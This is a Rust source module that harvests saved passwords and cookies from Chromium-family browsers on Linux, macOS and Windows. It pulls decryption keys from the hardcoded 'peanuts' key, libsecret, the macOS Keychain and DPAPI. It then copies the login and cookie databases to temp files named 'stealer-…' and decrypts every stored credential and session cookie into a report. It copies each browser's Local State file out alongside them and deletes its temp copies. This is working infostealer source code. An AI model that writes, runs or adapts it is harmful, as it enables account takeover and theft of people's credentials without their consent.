//! Chromium-family credential and cookie extraction.
//!
//! Linux uses the hardcoded `peanuts` key or libsecret; macOS uses the Keychain
//! "Safe Storage" item (1003 PBKDF2 rounds); Windows uses DPAPI-wrapped
//! Local State with AES-256-GCM. App-bound (v20) values are reported as locked
//! when they cannot be decrypted without elevation.

use std::{
    fs,
    path::{Path, PathBuf},
    sync::atomic::{AtomicU32, Ordering},
};

#[cfg(not(windows))]
use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
#[cfg(windows)]
use aes_gcm::{aead::Aead, Aes256Gcm, Nonce};
use base64::Engine;
#[cfg(not(windows))]
use pbkdf2::pbkdf2_hmac;
use rusqlite::{Connection, OpenFlags};
use serde::Serialize;
#[cfg(not(windows))]
use sha1::Sha1;

#[cfg(not(windows))]
use crate::run;
use crate::{flatten, home, MAX_ARTIFACT_BYTES};

#[cfg(not(windows))]
type Aes128Cbc = cbc::Decryptor<aes::Aes128>;

static NEXT: AtomicU32 = AtomicU32::new(0);

/// One extracted login.
#[derive(Debug, Clone, Serialize)]
pub struct Credential {
    /// Profile path the row came from.
    pub profile: String,
    /// Login origin.
    pub url: String,
    /// Username.
    pub username: String,
    /// Decrypted password.
    pub password: String,
    /// Creation time as Unix seconds when known.
    pub created: Option<i64>,
}

/// One extracted cookie.
#[derive(Debug, Clone, Serialize)]
pub struct Cookie {
    /// Profile path the row came from.
    pub profile: String,
    /// Host key.
    pub host: String,
    /// Cookie name.
    pub name: String,
    /// Decrypted value, or the raw prefix when locked.
    pub value: String,
}

/// Browser extraction result.
#[derive(Debug, Default, Serialize)]
pub struct Report {
    /// Extracted logins.
    pub credentials: Vec<Credential>,
    /// Extracted cookies.
    pub cookies: Vec<Cookie>,
    /// Non-fatal problems.
    pub warnings: Vec<String>,
}

/// One browser data root.
pub struct App {
    /// Browser key used for keyring lookups.
    pub name: &'static str,
    /// Profile parent directory.
    pub root: PathBuf,
}

/// Known Chromium-family data roots for this OS.
pub fn roots() -> Vec<App> {
    let Some(home) = home() else {
        return Vec::new();
    };
    let mut apps = Vec::new();
    #[cfg(target_os = "linux")]
    {
        let config = home.join(".config");
        for (name, path) in [
            ("chrome", "google-chrome"),
            ("chromium", "chromium"),
            ("brave", "BraveSoftware/Brave-Browser"),
            ("edge", "microsoft-edge"),
            ("vivaldi", "vivaldi"),
            ("opera", "opera"),
        ] {
            apps.push((name, config.join(path)));
        }
    }
    #[cfg(target_os = "macos")]
    {
        let support = home.join("Library/Application Support");
        for (name, path) in [
            ("chrome", "Google/Chrome"),
            ("chromium", "Chromium"),
            ("brave", "BraveSoftware/Brave-Browser"),
            ("edge", "Microsoft Edge"),
            ("vivaldi", "Vivaldi"),
        ] {
            apps.push((name, support.join(path)));
        }
    }
    #[cfg(windows)]
    {
        let _ = &home;
        if let Some(local) = std::env::var_os("LOCALAPPDATA") {
            let local = PathBuf::from(local);
            for (name, path) in [
                ("chrome", "Google/Chrome/User Data"),
                ("chromium", "Chromium/User Data"),
                ("brave", "BraveSoftware/Brave-Browser/User Data"),
                ("edge", "Microsoft/Edge/User Data"),
                ("vivaldi", "Vivaldi/User Data"),
            ] {
                apps.push((name, local.join(path)));
            }
        }
    }
    apps.into_iter()
        .filter(|(_, path)| path.is_dir())
        .map(|(name, root)| App { name, root })
        .collect()
}

/// Harvests every readable profile. `out` receives copies of `Local State`.
pub fn harvest(out: &Path, limit: usize) -> Report {
    let mut report = Report::default();
    for app in roots() {
        if report.credentials.len() >= limit {
            break;
        }
        let keys = keys(&app, out, &mut report);
        if keys.is_empty() {
            report
                .warnings
                .push(format!("{}: no usable Safe Storage key", app.name));
        }
        let Ok(entries) = fs::read_dir(&app.root) else {
            continue;
        };
        for entry in entries.filter_map(Result::ok) {
            let profile = entry.path();
            let name = entry.file_name().to_string_lossy().into_owned();
            if !profile.is_dir() || !(name == "Default" || name.starts_with("Profile")) {
                continue;
            }
            let login = profile.join("Login Data");
            if login.is_file() {
                read_logins(&login, &profile, &keys, &mut report, limit);
            }
            let cookies = profile.join("Cookies");
            if cookies.is_file() {
                read_cookies(&cookies, &profile, &keys, &mut report);
            }
            if report.credentials.len() >= limit {
                break;
            }
        }
    }
    report
}

struct Keys {
    cbc: Vec<Vec<u8>>,
    gcm: Vec<Vec<u8>>,
}

impl Keys {
    fn empty() -> Self {
        Self {
            cbc: Vec::new(),
            gcm: Vec::new(),
        }
    }
    fn is_empty(&self) -> bool {
        self.cbc.is_empty() && self.gcm.is_empty()
    }
}

fn keys(app: &App, out: &Path, report: &mut Report) -> Keys {
    let mut keys = Keys::empty();
    #[cfg(target_os = "linux")]
    {
        // A v10 browser may still be decryptable with the hardcoded key; v11
        // needs libsecret. Both are cheap, so try both rather than guess.
        keys.cbc.push(derive(b"peanuts", b"saltysalt", 1));
        for schema in [
            format!("application {}", app.name),
            format!(
                "xdg:schema chrome_libsecret_os_crypt_password_v2 application {}",
                app.name
            ),
        ] {
            let mut argv: Vec<&str> = vec!["lookup"];
            argv.extend(schema.split(' '));
            if let Some(secret) = run("secret-tool", &argv) {
                let secret = secret.trim_end_matches(['\n', '\r']);
                if secret.len() >= 16 {
                    keys.cbc.push(secret.as_bytes()[..16].to_vec());
                }
            }
        }
    }
    #[cfg(target_os = "macos")]
    {
        let services = match app.name {
            "brave" => "Brave Safe Storage",
            "edge" => "Microsoft Edge Safe Storage",
            "vivaldi" => "Vivaldi Safe Storage",
            "chromium" => "Chromium Safe Storage",
            _ => "Chrome Safe Storage",
        };
        if let Some(secret) = run("security", &["find-generic-password", "-w", "-s", services]) {
            let secret = secret.trim_end_matches(['\n', '\r']);
            if secret.len() >= 16 {
                keys.cbc.push(derive(secret.as_bytes(), b"saltysalt", 1003));
            }
        }
    }
    let state = app.root.join("Local State");
    if let Ok(bytes) = fs::read(&state) {
        let _ = fs::copy(&state, out.join(format!("{}_LocalState.json", app.name)));
        if let Ok(document) = serde_json::from_slice::<serde_json::Value>(&bytes) {
            if let Some(encoded) = document
                .pointer("/os_crypt/encrypted_key")
                .and_then(serde_json::Value::as_str)
            {
                #[allow(unused_mut)]
                if let Ok(mut raw) = base64::engine::general_purpose::STANDARD.decode(encoded) {
                    #[cfg(windows)]
                    {
                        if raw.starts_with(b"DPAPI") {
                            raw.drain(..5);
                        }
                        match dpapi(&raw) {
                            Some(key) if key.len() == 32 => keys.gcm.push(key),
                            _ => report
                                .warnings
                                .push(format!("{}: Local State key did not unwrap", app.name)),
                        }
                    }
                    #[cfg(not(windows))]
                    {
                        if raw.len() == 32 {
                            keys.gcm.push(raw);
                        }
                    }
                }
            }
        }
    }
    let _ = report;
    keys
}

#[cfg(not(windows))]
fn derive(secret: &[u8], salt: &[u8], rounds: u32) -> Vec<u8> {
    let mut key = vec![0_u8; 16];
    pbkdf2_hmac::<Sha1>(secret, salt, rounds, &mut key);
    key
}

fn decrypt(keys: &Keys, payload: &[u8]) -> Result<String, &'static str> {
    if payload.is_empty() {
        return Ok(String::new());
    }
    #[cfg(windows)]
    {
        if (payload.starts_with(b"v10") || payload.starts_with(b"v20")) && payload.len() > 15 {
            use aes_gcm::KeyInit as _;
            let body = &payload[3..];
            for key in &keys.gcm {
                let Ok(cipher) = Aes256Gcm::new_from_slice(key) else {
                    continue;
                };
                let nonce = Nonce::from_slice(&body[..12]);
                if let Ok(plain) = cipher.decrypt(nonce, &body[12..]) {
                    return Ok(String::from_utf8_lossy(&plain).into_owned());
                }
            }
            return Err("locked (app-bound v20 or bad key)");
        }
    }
    #[cfg(not(windows))]
    {
        if payload.starts_with(b"v10") || payload.starts_with(b"v11") {
            let body = &payload[3..];
            for key in &keys.cbc {
                let iv = [b' '; 16];
                let Ok(decryptor) = Aes128Cbc::new_from_slices(key, &iv) else {
                    continue;
                };
                let buffer = body.to_vec();
                if let Ok(plain) = decryptor.decrypt_padded_vec_mut::<Pkcs7>(&buffer) {
                    return Ok(String::from_utf8_lossy(&plain).into_owned());
                }
            }
            return Err("locked (v10/v11)");
        }
    }
    Err("unknown scheme")
}

fn scratch(source: &Path) -> Option<PathBuf> {
    let index = NEXT.fetch_add(1, Ordering::Relaxed);
    let base = std::env::temp_dir().join(format!("stealer-{}-{index}", std::process::id()));
    fs::copy(source, &base).ok()?;
    for suffix in ["-wal", "-shm"] {
        let side = PathBuf::from(format!("{}{suffix}", source.display()));
        if side.is_file() {
            let _ = fs::copy(&side, format!("{}{suffix}", base.display()));
        }
    }
    Some(base)
}

fn open(source: &Path) -> Option<(Connection, PathBuf)> {
    let copy = scratch(source)?;
    let connection = Connection::open_with_flags(
        &copy,
        OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
    )
    .ok()?;
    Some((connection, copy))
}

fn read_logins(path: &Path, profile: &Path, keys: &Keys, report: &mut Report, limit: usize) {
    let Some((connection, copy)) = open(path) else {
        report
            .warnings
            .push(format!("{}: could not open Login Data", profile.display()));
        return;
    };
    let rows: Vec<(String, String, Vec<u8>, Option<i64>)> = {
        let Ok(mut statement) = connection
            .prepare("SELECT origin_url, username_value, password_value, date_created FROM logins")
        else {
            let _ = fs::remove_file(copy);
            return;
        };
        let rows = statement.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, Vec<u8>>(2)?,
                row.get::<_, i64>(3).ok(),
            ))
        });
        rows.map(|rows| rows.filter_map(Result::ok).collect())
            .unwrap_or_default()
    };
    for row in rows {
        if report.credentials.len() >= limit {
            break;
        }
        let (url, username, encrypted, created) = row;
        if url.is_empty() && username.is_empty() {
            continue;
        }
        let password = match decrypt(keys, &encrypted) {
            Ok(value) => value,
            Err(reason) => {
                report
                    .warnings
                    .push(format!("{}: {url}: {reason}", profile.display()));
                continue;
            }
        };
        let created = created.map(|value| value / 1_000_000 - 11_644_473_600);
        report.credentials.push(Credential {
            profile: profile.display().to_string(),
            url,
            username,
            password,
            created,
        });
    }
    let _ = fs::remove_file(&copy);
    let _ = fs::remove_file(format!("{}-wal", copy.display()));
    let _ = fs::remove_file(format!("{}-shm", copy.display()));
}

fn read_cookies(path: &Path, profile: &Path, keys: &Keys, report: &mut Report) {
    let Some((connection, copy)) = open(path) else {
        return;
    };
    let rows: Vec<(String, String, Vec<u8>)> = {
        let Ok(mut statement) =
            connection.prepare("SELECT host_key, name, encrypted_value FROM cookies LIMIT 4096")
        else {
            let _ = fs::remove_file(copy);
            return;
        };
        let rows = statement.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, Vec<u8>>(2)?,
            ))
        });
        rows.map(|rows| rows.filter_map(Result::ok).collect())
            .unwrap_or_default()
    };
    for (host, name, encrypted) in rows {
        let value = decrypt(keys, &encrypted)
            .unwrap_or_else(|_| format!("<{}>", flatten(Path::new(&name))));
        report.cookies.push(Cookie {
            profile: profile.display().to_string(),
            host,
            name,
            value,
        });
    }
    let _ = fs::remove_file(&copy);
    let _ = fs::remove_file(format!("{}-wal", copy.display()));
    let _ = fs::remove_file(format!("{}-shm", copy.display()));
}

/// Copies a profile's `Local State` as a standalone artifact.
pub fn copy_local_state(app_root: &Path, out: &Path) -> Option<PathBuf> {
    let state = app_root.join("Local State");
    let meta = fs::metadata(&state).ok()?;
    if meta.len() > MAX_ARTIFACT_BYTES {
        return None;
    }
    let dest = out.join("browsers").join(flatten(&state));
    fs::create_dir_all(dest.parent()?).ok()?;
    fs::copy(&state, &dest).ok()?;
    Some(dest)
}

#[cfg(windows)]
#[allow(unsafe_code)]
fn dpapi(data: &[u8]) -> Option<Vec<u8>> {
    use windows_sys::Win32::{
        Foundation::LocalFree,
        Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB},
    };
    let input = CRYPT_INTEGER_BLOB {
        cbData: data.len() as u32,
        pbData: data.as_ptr() as *mut u8,
    };
    let mut output = CRYPT_INTEGER_BLOB {
        cbData: 0,
        pbData: std::ptr::null_mut(),
    };
    // SAFETY: both blobs are valid for the call; the output buffer is owned by
    // the allocator and freed with LocalFree below.
    let ok = unsafe {
        CryptUnprotectData(
            &input,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            &mut output,
        )
    };
    if ok == 0 {
        return None;
    }
    // SAFETY: on success the OS filled `output` with `cbData` readable bytes.
    let bytes =
        unsafe { std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec() };
    unsafe { LocalFree(output.pbData.cast()) };
    Some(bytes)
}
